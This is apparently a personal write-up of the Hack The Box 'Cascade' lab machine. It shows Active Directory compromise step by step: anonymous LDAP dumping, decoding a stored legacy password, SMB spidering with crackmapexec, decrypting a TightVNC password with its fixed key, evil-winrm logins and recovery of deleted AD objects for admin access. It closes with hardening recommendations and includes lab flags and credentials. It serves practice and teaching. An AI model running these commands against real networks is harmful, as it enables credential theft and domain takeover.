# Nmap
```bash
nmap 10.10.10.182 -sC -sV
```
13 ports open. Showing that it is also a domain controller. LDAP leaks the domain name of cascade.local

Adding that to /etc/hosts

As there is no webserver checking LDAP and SMB

# LDAP
```bash
ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts
```
Domain DC=cascade,DC=local

Then dump LDAP
```bash
ldapsearch -x -H ldap://10.10.10.182 -s sub -b 'DC=cascade,DC=local' > ldap_anon
```
Enumerate usernames, to try to find username conventions
```bash
cat ldap_anon | grep sAMAccountName
```
This shows a naming convention of f.lastname
```
s.smith
r.thompson
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
j.allen
i.croft
```
Check for unique values. Which finds a legacyPwd.
```bash
cat ldap_anon | sort | uniq -c | sort -nr
	1 cascadeLegacyPwd: clk0bjVldmE=
```
b64 decode
rY4n5eva

This is r.thompson's password :)

Check with crackmapexec
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva
```
This works but doesn't say pwned.

Check smb with user.
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares
```
Unique things.
Data and print

Using spider_plus in cme
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva -M spider_plus
```

Interesting files.
- meeting notes
- recyclebin
- s.smith files
- mapdatadrive

# SMB Drives
Mount the drives
```bash
sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/data /mnt/data

sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/netlogon /mnt/netlogon
```

Check the netlogon files. No passwords :(

Audit drive? no permission to mount drive :(
password in vnc install.reg
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```
kÏ*KnZÊ.
```
which is encrypted

# VNC

googling vnc it turns out to be tightvnc which has a static key :/
running these commands from with irb in msf6:
```ruby
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"  
require 'rex/proto/rfb'  
Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
```
outputs
```
sT333ve2
```

This will be the password for s.smith
trying with cme again

```bash
crackmapexec 10.10.10.182 -u s.smith -p sT333ve2
```
Which says Pwn3d! !

# Foothold
User flag
```bash
3a48ee5fd948da5862bad545d8f3e1e0
```

```bash
crackmapexec smb 10.10.10.182 -u s.smith -p sT333ve2 -M spider_plus
```
This shows a new audit share with 3 interesting files.

runAudit.bat, cascaudit.exe, casccrypt.dll

Reverse engineer the exe to return the output from line 44.
Using dnSpy.
```
w3lc0meFr31nd
```
But for what user?

Dump the sql database
```bash
sqlite3 Audit.db .dump
```
Password was for ArkSvc
Login with evil-winrm
```bash
evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
```
Check privs

member of the recycle bin group?
So we can get deleted items?

Google says yes!

Get-ADObject
```powershell
Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter
{ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
```

Two files.
One which has a cascadeLegacyPwd :)
```
baCT3r1aN00dles
```
Which is the default admin password (from the note earlier)

check for the administrator user.
```powershell
net user administrator
```

The final evil-winrm
and admin :)
```shell
d5a30650809a2b377278273b7d0b7f38
```

# Clean up
Didn't add any files.

# Recommendations
- Dont reuse passwords for admin accounts.
- Remove the cascadeLegacyPwd field from r.thompson and tempadmin from within LDAP.
- Use a better vnc type as this one has a static password, so the encryption is useless.
- Dont have hardcoded credentials for an encryption algorithm (Audit.exe)
- Why does s.smith need to be able to view the database?
- Have a stronger password policy and have rotations every 30 days.
- Disable winrm on all accounts that dont need it.



---
Creation date: 28-10-2022

Last modified date: Friday 28th October 2022
***
